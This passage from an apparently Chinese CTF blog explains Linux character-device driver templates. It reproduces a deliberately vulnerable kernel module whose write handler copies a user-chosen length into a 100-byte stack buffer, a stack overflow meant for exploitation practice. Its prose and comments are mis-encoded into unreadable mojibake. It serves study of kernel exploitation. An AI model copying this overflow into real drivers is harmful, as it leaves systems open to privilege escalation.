class="keyword">if</span> (cdev_add(&amp;cdev, dev_no, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        device_destroy(devClass, dev_no);</span><br><span class="line">        class_destroy(devClass);</span><br><span class="line">        unregister_chrdev_region(dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] &lt;Major, Minor&gt;: &lt;%d, %d&gt;\n&quot;</span>, MAJOR(dev_no), MINOR(dev_no));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="2-äº¤äº’å¥—è·¯"   >
          <a href="#2-äº¤äº’å¥—è·¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-äº¤äº’å¥—è·¯" class="headerlink" title="(2)äº¤äº’å¥—è·¯"></a>(2)äº¤äº’å¥—è·¯</h3>
      <p>å®‰è£…å®Œæˆä¹‹åè¿˜éœ€è¦äº¤äº’ï¼Œç”¨åˆ°<code>file_operations</code>ç»“æ„ä½“ä¸­çš„æˆå‘˜å‡½æ•°ï¼Œé¦–å…ˆäº†è§£ä¸‹è¿™ä¸ªç»“æ„ä½“ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///linux/fs.h 	kernel 5.14.8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*read_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*write_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">	<span class="keyword">int</span> (*iopoll)(struct kiocb *kiocb, <span class="keyword">bool</span> spin);</span><br><span class="line">	<span class="keyword">int</span> (*iterate) (struct file *, struct dir_context *);</span><br><span class="line">	<span class="keyword">int</span> (*iterate_shared) (struct file *, struct dir_context *);</span><br><span class="line">	<span class="keyword">__poll_t</span> (*poll) (struct file *, struct poll_table_struct *);</span><br><span class="line">	<span class="keyword">long</span> (*unlocked_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">	<span class="keyword">long</span> (*compat_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">	<span class="keyword">int</span> (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> mmap_supported_flags;</span><br><span class="line">	<span class="keyword">int</span> (*open) (struct inode *, struct file *);</span><br><span class="line">	<span class="keyword">int</span> (*flush) (struct file *, <span class="keyword">fl_owner_t</span> id);</span><br><span class="line">	<span class="keyword">int</span> (*release) (struct inode *, struct file *);</span><br><span class="line">	<span class="keyword">int</span> (*fsync) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">loff_t</span>, <span class="keyword">int</span> datasync);</span><br><span class="line">	<span class="keyword">int</span> (*fasync) (<span class="keyword">int</span>, struct file *, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*lock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*sendpage) (struct file *, struct page *, <span class="keyword">int</span>, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *, <span class="keyword">int</span>);</span><br><span class="line">	<span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(struct file *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span></span>;</span><br><span class="line">	<span class="keyword">int</span> (*check_flags)(<span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*flock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*splice_write)(struct pipe_inode_info *, struct file *, <span class="keyword">loff_t</span> *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*splice_read)(struct file *, <span class="keyword">loff_t</span> *, struct pipe_inode_info *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*setlease)(struct file *, <span class="keyword">long</span>, struct file_lock **, <span class="keyword">void</span> **);</span><br><span class="line">	<span class="keyword">long</span> (*fallocate)(struct file *file, <span class="keyword">int</span> mode, <span class="keyword">loff_t</span> offset,</span><br><span class="line">			  <span class="keyword">loff_t</span> len);</span><br><span class="line">	<span class="keyword">void</span> (*show_fdinfo)(struct seq_file *m, struct file *f);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="keyword">unsigned</span> (*mmap_capabilities)(struct file *);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">ssize_t</span> (*copy_file_range)(struct file *, <span class="keyword">loff_t</span>, struct file *,</span><br><span class="line">			<span class="keyword">loff_t</span>, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">loff_t</span> (*remap_file_range)(struct file *file_in, <span class="keyword">loff_t</span> pos_in,</span><br><span class="line">				   struct file *file_out, <span class="keyword">loff_t</span> pos_out,</span><br><span class="line">				   <span class="keyword">loff_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> remap_flags);</span><br><span class="line">	<span class="keyword">int</span> (*fadvise)(struct file *, <span class="keyword">loff_t</span>, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></div></figure>

<p>å…·ä½“ä¸€ç‚¹ä½¿ç”¨å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330164350249.png" alt="image-20220330164350249"></p>
<p>å‚è€ƒ:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=EJ0JQKvxf70&amp;list=PLEJtkJ02eJVX9I66wJD1tn07R52DxVXG0&amp;index=4" >https://www.youtube.com/watch?v=EJ0JQKvxf70&amp;list=PLEJtkJ02eJVX9I66wJD1tn07R52DxVXG0&amp;index=4</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>å…¶ä¸­å¸¸ç”¨çš„å°±æ˜¯readï¼Œwriteç­‰å‡½æ•°ã€‚</p>
<p>ä¹‹åä¹Ÿæ˜¯æ­£å¸¸çš„è°ƒç”¨å‡½æ•°ï¼Œå¥—è·¯ç¼–å†™</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¯»è®¾å¤‡</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">xxx_read</span><span class="params">(struct file *filp, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count, </span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">loff_t</span> *f_pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    copy_to_user(buf, ..., ...); <span class="comment">// å†…æ ¸ç©ºé—´åˆ°ç”¨æˆ·ç©ºé—´ç¼“å†²åŒºçš„å¤åˆ¶</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å†™è®¾å¤‡</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">xxx_write</span><span class="params">(struct file *filp, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf, </span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *f_pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    copy_from_user(..., buf, ...); <span class="comment">// ç”¨æˆ·ç©ºé—´ç¼“å†²åŒºåˆ°å†…æ ¸ç©ºé—´çš„å¤åˆ¶</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ioctlå‡½æ•°å‘½ä»¤æ§åˆ¶</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">xxx_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> XXX_CMD1:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> XXX_CMD2:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// ä¸æ”¯æŒçš„å‘½ä»¤</span></span><br><span class="line">        <span class="keyword">return</span> -ENOTTY;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åéœ€è¦<code>file_operations</code>ç»“æ„ä½“ä¸­çš„å‡½æ•°æ¥é‡å†™ç”¨æˆ·ç©ºé—´çš„writeï¼Œopenï¼Œreadç­‰å‡½æ•°ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">xxx_fops</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">                .owner = THIS_MODULE,</span><br><span class="line">                <span class="comment">// .open = xxx_open,</span></span><br><span class="line">                <span class="comment">// .release = xxx_close,</span></span><br><span class="line">                .write = xxx_write,</span><br><span class="line">                .read = xxxx_read</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å½“ç”¨æˆ·ç©ºé—´æ‰“å¼€è¯¥è®¾å¤‡ï¼Œè°ƒç”¨è¯¥è®¾å¤‡çš„<code>write</code>å‡½æ•°ï¼Œå°±èƒ½é€šè¿‡<code>.write</code>è¿›å…¥åˆ°<code>xxx_write</code>å‡½æ•°ä¸­ã€‚</p>
<p>â–²è¿™æ ·ä¸€äº›å¸¸è§„kernelé¢˜çš„ç¼–å†™æ¨¡æ¿å°±æ€»ç»“å‡ºæ¥äº†ã€‚</p>

        <h3 id="3-å…·ä½“çš„é¢˜ç›®"   >
          <a href="#3-å…·ä½“çš„é¢˜ç›®" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å…·ä½“çš„é¢˜ç›®" class="headerlink" title="(3)å…·ä½“çš„é¢˜ç›®"></a>(3)å…·ä½“çš„é¢˜ç›®</h3>
      <p>åŸé¢˜ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/black-bunny/LinKern-x86_64-bypass-SMEP-KASLR-kptr_restric" >https://github.com/black-bunny/LinKern-x86_64-bypass-SMEP-KASLR-kptr_restric</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="â‘ ä»£ç å’Œç®€å•çš„è§£æ"   >
          <a href="#â‘ ä»£ç å’Œç®€å•çš„è§£æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ ä»£ç å’Œç®€å•çš„è§£æ" class="headerlink" title="â‘ ä»£ç å’Œç®€å•çš„è§£æ"></a>â‘ ä»£ç å’Œç®€å•çš„è§£æ</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kdev_t.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ­£å¸¸çš„è®¾ç½®äº†dev_tå’Œcdevï¼Œä½†æ˜¯è¿™é‡Œä½¿ç”¨çš„classè¿™ä¸ªæ¨¡æ¿æ¥åˆ›å»ºè®¾å¤‡é©±åŠ¨</span></span><br><span class="line"><span class="comment">//é«˜12ä½ä¸ºä¸»è®¾å¤‡å·ï¼Œä½20ä½ä¸ºæ¬¡è®¾å¤‡å·</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">dev_t</span> first; <span class="comment">// Global variable for the first device number</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">c_dev</span>;</span> <span class="comment">// Global variable for the character device structure</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">cl</span>;</span> <span class="comment">// Global variable for the device class</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *buffer_var;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰“å¼€å…³é—­è®¾å¤‡çš„æ¶ˆæ¯æç¤ºå‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">vuln_open</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;[i] Module vuln: open()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">vuln_close</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;[i] Module vuln: close()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä»buffer_varä¸­è¯»å–æ•°æ®</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">vuln_read</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer_var)&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] Module vuln read: %s\n&quot;</span>, buffer_var);</span><br><span class="line">    kfree(buffer_var);</span><br><span class="line">    buffer_var=kmalloc(<span class="number">100</span>,GFP_DMA);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å‘bufferä¸­å†™å…¥æ•°æ®ï¼Œç„¶åæ‹·è´ç»™buffer_varï¼Œè¿™é‡Œå°±æ˜¯æ¼æ´å­˜åœ¨ç‚¹ã€‚</span></span><br><span class="line"><span class="comment">//ç”±äºlenå’Œbuféƒ½æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œè€Œbufferæ˜¯æ ˆä¸Šçš„æ•°æ®ï¼Œé•¿åº¦ä¸º100ã€‚</span></span><br><span class="line"><span class="comment">//æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡lenå’Œbufï¼Œå°†æ•°æ®å¤åˆ¶ç»™bufferä»è€Œè¿›è¡Œæ ˆæº¢å‡ºã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">vuln_write</span><span class="params">(struct file *f, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,<span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">if</span> (_copy_from_user(buffer, buf, len))</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line">  buffer[len<span class="number">-1</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  printk(<span class="string">&quot;[i] Module vuln write: %s\n&quot;</span>, buffer);</span><br><span class="line">  <span class="built_in">strncpy</span>(buffer_var,buffer,len);</span><br><span class="line">  <span class="keyword">return</span> len;<span class="comment">//è¿”å›å€¼ä¸èƒ½ä¸º0,ä¸ç„¶ä¼šä¸€ç›´è°ƒç”¨è¯¥å‡½æ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//file_operationsç»“æ„ä½“åˆå§‹åŒ–</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pugs_fops</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .owner = THIS_MODULE,</span><br><span class="line">  .open = vuln_open,</span><br><span class="line">  .release = vuln_close,</span><br><span class="line">  .write = vuln_write,</span><br><span class="line">  .read = vuln_read</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//é©±åŠ¨è®¾å¤‡åŠ è½½å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">vuln_init</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Constructor */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  buffer_var=kmalloc(<span class="number">100</span>,GFP_DMA);</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;[i] Module vuln registered&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (alloc_chrdev_region(&amp;first, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;vuln&quot;</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((cl = class_create(THIS_MODULE, <span class="string">&quot;chardrv&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (device_create(cl, <span class="literal">NULL</span>, first, <span class="literal">NULL</span>, <span class="string">&quot;vuln&quot;</span>) == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] Module vuln error&quot;</span>);</span><br><span class="line">    class_destroy(cl);</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  cdev_init(&amp;c_dev, &amp;pugs_fops);</span><br><span class="line">  <span class="keyword">if</span> (cdev_add(&amp;c_dev, first, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    device_destroy(cl, first);</span><br><span class="line">    class_destroy(cl);</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;[i] &lt;Major, Minor&gt;: &lt;%d, %d&gt;\n&quot;</span>, MAJOR(first), MINOR(first));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//é©±åŠ¨è®¾å¤‡å¸è½½å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">vuln_exit</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Destructor */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">3</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Module vuln unregistered&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(vuln_init);</span><br><span class="line">module_exit(vuln_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;blackndoor&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Module vuln overflow&quot;</span>);</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡å†…æ ¸å‡½æ•°è§£æ"   >
          <a href="#â‘¡å†…æ ¸å‡½æ•°è§£æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡å†…æ ¸å‡½æ•°è§£æ" class="headerlink" title="â‘¡å†…æ ¸å‡½æ•°è§£æ"></a>â‘¡å†…æ ¸å‡½æ•°è§£æ</h4>
      
        <h5 id="printk"   >
          <a href="#printk" class="heading-link"><i class="fas fa-link"></i></a><a href="#printk" class="headerlink" title="printk:"></a><code>printk</code>:</h5>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printk(æ—¥å¿—çº§åˆ« <span class="string">&quot;æ¶ˆæ¯æ–‡æœ¬&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­æ—¥å¿—çº§åˆ«å®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#defineKERN_EMERG <span class="string">&quot;&lt;0&gt;&quot;</span><span class="comment">/*ç´§æ€¥äº‹ä»¶æ¶ˆæ¯ï¼Œç³»ç»Ÿå´©æºƒä¹‹å‰æç¤ºï¼Œè¡¨ç¤ºç³»ç»Ÿä¸å¯ç”¨*/</span></span><br><span class="line">#defineKERN_ALERT <span class="string">&quot;&lt;1&gt;&quot;</span><span class="comment">/*æŠ¥å‘Šæ¶ˆæ¯ï¼Œè¡¨ç¤ºå¿…é¡»ç«‹å³é‡‡å–æªæ–½*/</span></span><br><span class="line">#defineKERN_CRIT <span class="string">&quot;&lt;2&gt;&quot;</span><span class="comment">/*ä¸´ç•Œæ¡ä»¶ï¼Œé€šå¸¸æ¶‰åŠä¸¥é‡çš„ç¡¬ä»¶æˆ–è½¯ä»¶æ“ä½œå¤±è´¥*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_ERR <span class="meta-string">&quot;&lt;3&gt;&quot;</span><span 